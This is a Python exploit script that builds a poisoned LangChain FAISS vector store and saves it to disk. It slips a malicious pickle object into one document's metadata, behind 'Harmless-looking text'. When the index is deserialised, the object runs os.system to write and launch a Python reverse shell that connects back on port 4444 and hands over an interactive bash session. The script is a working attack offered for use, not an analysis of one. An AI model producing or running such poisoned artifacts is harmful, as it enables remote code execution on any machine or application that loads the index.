from langchain.vectorstores import FAISS
from langchain.embeddings import OllamaEmbeddings
from langchain.schema import Document
import numpy as np
#import faiss
import pickle
import os

# Step 1: Basic setup
embeddings = OllamaEmbeddings()
texts = ["This is some sample text.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document.", "Another sample document."]
faiss_index = FAISS.from_texts(texts, embeddings)

# Step 2: Define the exploit class
class Exploit:
    def __reduce__(self):
        import os
        cmd = (
            'bash -c \'cat <<EOF > /tmp/rshell.py\n'
            'import socket,subprocess,os\n'
            's=socket.socket()\n'
            's.connect(("127.0.0.1",4444))\n'
            'os.dup2(s.fileno(),0)\n'
            'os.dup2(s.fileno(),1)\n'
            'os.dup2(s.fileno(),2)\n'
            'subprocess.call(["/bin/bash","-i"])\n'
            'EOF\n'
            'python3 /tmp/rshell.py &\''
        )
        return (os.system, (cmd,))

# Step 3: Create a dummy vector (same dimension as index)
dim = faiss_index.index.d
malicious_vector = np.random.rand(dim).astype("float32")
faiss_index.index.add(np.array([malicious_vector]))

# Step 4: Add malicious payload in metadata (not page_content!)
malicious_id = str(len(faiss_index.index_to_docstore_id))
faiss_index.index_to_docstore_id[len(faiss_index.index_to_docstore_id)] = malicious_id

malicious_doc = Document(
    page_content="Harmless-looking text.",
    metadata={"exploit": Exploit()}
)
faiss_index.docstore._dict[malicious_id] = malicious_doc

# Step 5: Save poisoned index
faiss_index.save_local("malicious_vectorstore1")

